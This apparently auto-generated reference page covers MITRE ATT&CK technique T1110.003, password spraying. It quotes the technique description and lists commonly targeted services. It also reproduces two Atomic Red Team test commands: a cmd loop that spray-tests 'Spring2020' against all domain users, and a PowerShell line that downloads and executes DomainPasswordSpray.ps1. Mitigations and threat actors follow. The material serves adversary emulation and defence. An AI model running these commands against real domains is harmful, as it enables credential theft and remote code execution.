
# Password Spraying

## Description

### MITRE Description

> Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure', 'Office 365', 'Azure AD', 'SaaS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1110/003

## Potential Commands

```
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Spring2017 -Domain (Get-ADDomain | Select-Object -ExpandProperty Name) -Force
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL
```

## Commands Dataset

```
[{'command': '@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use '
             '%logonserver%\\IPC$ /user:"%userdomain%\\%n" "Spring2020" 1>NUL '
             '2>&1 && @echo [*] %n:Spring2020 && @net use /delete '
             '%logonserver%\\IPC$ > NUL\n',
  'name': None,
  'source': 'atomics/T1110.003/T1110.003.yaml'},
 {'command': 'IEX (IWR '
             "'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); "
             'Invoke-DomainPasswordSpray -Password Spring2017 -Domain '
             '(Get-ADDomain | Select-Object -ExpandProperty Name) -Force\n',
  'name': None,
  'source': 'atomics/T1110.003/T1110.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Brute Force: Password Spraying': {'atomic_tests': [{'auto_generated_guid': '90bc2e54-6c84-47a5-9439-0a2a92b4b175',
                                                                              'dependencies': [{'description': 'List '
                                                                                                               'of '
                                                                                                               'domain '
                                                                                                               'users '
                                                                                                               'to '
                                                                                                               'password '
                                                                                                               'spray '
                                                                                                               'must '
                                                                                                               'exits '
                                                                                                               'at '
                                                                                                               '%temp%\\users.txt\n',
                                                                                                'get_prereq_command': 'PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\n',
                                                                                                'prereq_command': 'if '
                                                                                                                  'not '
                                                                                                                  'exist '
                                                                                                                  '%temp%\\users.txt '
                                                                                                                  '(exit '
                                                                                                                  '/b '
                                                                                                                  '1)\n'}],
                                                                              'description': 'CAUTION! '
                                                                                             'Be '
                                                                                             'very '
                                                                                             'careful '
                                                                                             'to '
                                                                                             'not '
                                                                                             'exceed '
                                                                                             'the '
                                                                                             'password '
                                                                                             'lockout '
                                                                                             'threshold '
                                                                                             'for '
                                                                                             'users '
                                                                                             'in '
                                                                                             'the '
                                                                                             'domain '
                                                                                             'by '
                                                                                             'running '
                                                                                             'this '
                                                                                             'test '
                                                                                             'too '
                                                                                             'frequently.\n'
                                                                                             'This '
                                                                                             'atomic '
                                                                                             'attempts '
                                                                                             'to '
                                                                                             'map '
                                                                                             'the '
                                                                                             'IPC$ '
                                                                                             'share '
                                                                                             'on '
                                                                                             'one '
                                                                                             'of '
                                                                                             'the '
                                                                                             'Domain '
                                                                                             'Controllers '
                                                                                             'using '
                                                                                             'a '
                                                                                             'password '
                                                                                             'of '
                                                                                             'Spring2020 '
                                                                                             'for '
                                                                                             'each '
                                                                                             'user '
                                                                                             'in '
                                                                                             'the '
                                                                                             '%temp%\\users.txt '
                                                                                             'list. '
                                                                                             'Any '
                                                                                             'successful '
                                                                                             'authentications '
                                                                                             'will '
                                                                                             'be '
                                                                                             'printed '
                                                                                             'to '
                                                                                             'the '
                                                                                             'screen '
                                                                                             'with '
                                                                                             'a '
                                                                                             'message '
                                                                                             'like '
                                                                                             '"[*] '
                                                                                             'username:password", '
                                                                                             'whereas '
                                                                                             'a '
                                                                                             'failed '
                                                                                             'auth '
                                                                                             'will '
                                                                                             'simply '
                                                                                             'print '
                                                                                             'a '
                                                                                             'period. '
                                                                                             'Use '
                                                                                             'the '
                                                                                             'input '
                                                                                             'arguments '
                                                                                             'to '
                                                                                             'specify '
                                                                                             'your '
                                                                                             'own '
                                                                                             'password '
                                                                                             'to '
                                                                                             'use '
                                                                                             'for '
                                                                                             'the '
                                                                                             'password '
                                                                                             'spray.\n'
                                                                                             'Use '
                                                                                             'the '
                                                                                             "get_prereq_command's "
                                                                                             'to '
                                                                                             'create '
                                                                                             'a '
                                                                                             'list '
                                                                                             'of '
                                                                                             'all '
                                                                                             'domain '
                                                                                             'users '
                                                                                             'in '
                                                                                             'the '
                                                                                             'temp '
                                                                                             'directory '
                                                                                             'called '
                                                                                             'users.txt.\n'
                                                                                             'See '
                                                                                             'the '
                                                                                             '"Windows '
                                                                                             'FOR '
                                                                                             'Loop '
                                                                                             'Password '
                                                                                             'Spraying '
                                                                                             'Made '
                                                                                             'Easy" '
                                                                                             'blog '
                                                                                             'by '
                                                                                             '@OrEqualsOne '
                                                                                             'for '
                                                                                             'more '
                                                                                             'details '
                                                                                             'on '
                                                                                             'how '
                                                                                             'these '
                                                                                             'spray '
                                                                                             'commands '
                                                                                             'work. '
                                                                                             'https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5',
                                                                              'executor': {'command': '@FOR '
                                                                                                      '/F '
                                                                                                      '%n '
                                                                                                      'in '
                                                                                                      '(%temp%\\users.txt) '
                                                                                                      'do '
                                                                                                      '@echo '
                                                                                                      '| '
                                                                                                      'set/p=. '
                                                                                                      '& '
                                                                                                      '@net '
                                                                                                      'use '
                                                                                                      '%logonserver%\\IPC$ '
                                                                                                      '/user:"%userdomain%\\%n" '
                                                                                                      '"#{password}" '
                                                                                                      '1>NUL '
                                                                                                      '2>&1 '
                                                                                                      '&& '
                                                                                                      '@echo '
                                                                                                      '[*] '
                                                                                                      '%n:#{password} '
                                                                                                      '&& '
                                                                                                      '@net '
                                                                                                      'use '
                                                                                                      '/delete '
                                                                                                      '%logonserver%\\IPC$ '
                                                                                                      '> '
                                                                                                      'NUL\n',
                                                                                           'elevation_required': False,
                                                                                           'name': 'command_prompt'},
                                                                              'input_arguments': {'password': {'default': 'Spring2020',
                                                                                                               'description': 'The '
                                                                                                                              'password '
                                                                                                                              'to '
                                                                                                                              'try '
                                                                                                                              'for '
                                                                                                                              'each '
                                                                                                                              'user '
                                                                                                                              'in '
                                                                                                                              'users.txt',
                                                                                                               'type': 'string'}},
                                                                              'name': 'Password '
                                                                                      'Spray '
                                                                                      'all '
                                                                                      'Domain '
                                                                                      'Users',
                                                                              'supported_platforms': ['windows']},
                                                                             {'auto_generated_guid': '263ae743-515f-4786-ac7d-41ef3a0d4b2b',
                                                                              'description': 'Perform '
                                                                                             'a '
                                                                                             'domain '
                                                                                             'password '
                                                                                             'spray '
                                                                                             'using '
                                                                                             'the '
                                                                                             'DomainPasswordSpray '
                                                                                             'tool. '
                                                                                             'It '
                                                                                             'will '
                                                                                             'try '
                                                                                             'a '
                                                                                             'single '
                                                                                             'password '
                                                                                             'against '
                                                                                             'all '
                                                                                             'users '
                                                                                             'in '
                                                                                             'the '
                                                                                             'domain\n'
                                                                                             '\n'
                                                                                             'https://github.com/dafthack/DomainPasswordSpray\n',
                                                                              'executor': {'command': 'IEX '
                                                                                                      '(IWR '
                                                                                                      "'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); "
                                                                                                      'Invoke-DomainPasswordSpray '
                                                                                                      '-Password '
                                                                                                      'Spring2017 '
                                                                                                      '-Domain '
                                                                                                      '#{domain} '
                                                                                                      '-Force\n',
                                                                                           'elevation_required': False,
                                                                                           'name': 'powershell'},
                                                                              'input_arguments': {'domain': {'default': '(Get-ADDomain '
                                                                                                                        '| '
                                                                                                                        'Select-Object '
                                                                                                                        '-ExpandProperty '
                                                                                                                        'Name)',
                                                                                                             'description': 'Domain '
                                                                                                                            'to '
                                                                                                                            'brute '
                                                                                                                            'force '
                                                                                                                            'against',
                                                                                                             'type': 'String'}},
                                                                              'name': 'Password '
                                                                                      'Spray '
                                                                                      '(DomainPasswordSpray)',
                                                                              'supported_platforms': ['windows']}],
                                                            'attack_technique': 'T1110.003',
                                                            'display_name': 'Brute '
                                                                            'Force: '
                                                                            'Password '
                                                                            'Spraying'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [Account Use Policies](../mitigations/Account-Use-Policies.md)

* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    

# Actors


* [Leafminer](../actors/Leafminer.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT33](../actors/APT33.md)
    
